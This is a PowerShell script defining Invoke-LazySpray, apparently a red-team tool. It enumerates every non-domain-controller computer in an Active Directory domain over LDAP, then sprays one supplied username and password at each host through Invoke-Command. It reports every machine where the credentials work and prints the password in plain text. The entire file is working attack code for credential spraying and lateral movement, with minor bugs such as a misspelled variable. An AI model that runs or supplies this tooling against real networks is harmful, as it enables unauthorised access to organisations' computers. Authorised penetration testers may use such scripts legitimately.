function Invoke-LazySpray()
{
    [CmdletBinding()]
    Param(

        [Parameter(Mandatory=$false, Position=0)]
        [string]$Username,

        [Parameter(Mandatory=$false, Position=1)]
        [string]$Password
    )
    
    $ldapFilter = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
    $searcher = [ADSISearcher]$ldapFilter
    $computers = ($searcher.FindAll().Path.Replace("LDAP://","") -replace '^CN=|,.*$')

    if ($Username -and $Password)
    {
        $pass=ConvertTo-SecureString -AsPlainText -Force $Password
        $credential=New-Object System.Management.Automation.PSCredential($Username,$pass)
        LocalAccess($credential)
    }
    else
    {
        Write-Host -ForegroundColor Red -BackgroundColor Black '[ERROR] Please Specify -Username and -Password'
    }

}

function LocalAccess($credential)
{
    Write-verbose ('Testing current session againsts {0} computers' -f ($computers.Count))
            
    if($credential)
    {
        foreach($computer in $computers)
        {
            Write-Verbose ('Testing againts {0}' -f $computer)
            $sessions=Invoke-Command -ComputerName $computer -Credential $credential -ScriptBlock {whoami} -ErrorAction SilentlyContinue
            if($sessions)
            {
                Write-Host -ForegroundColor Green ('[SUCCEED] Username: {0}, Password: {1}, TargetComputer: {2}' -f $Username,$Password,$computer)
            }
        }
    }
    else
    {  
        foreach($computer in $computers)
        {
            try{
                $sessioss=Invoke-Command -ComputerName $computer -ScriptBlock {whoami} -ErrorAction SilentlyContinue
                if($sessions)
                {
                    Write-Verbose ('[SUCCEED] TargetComputer: {0}' -f $computer)
                }
            }
            catch
            {
                Write-Verbose -ForegroundColor Red -BackgroundColor Black '[ERROR] Could Not connect'
            }
        }   
    }
}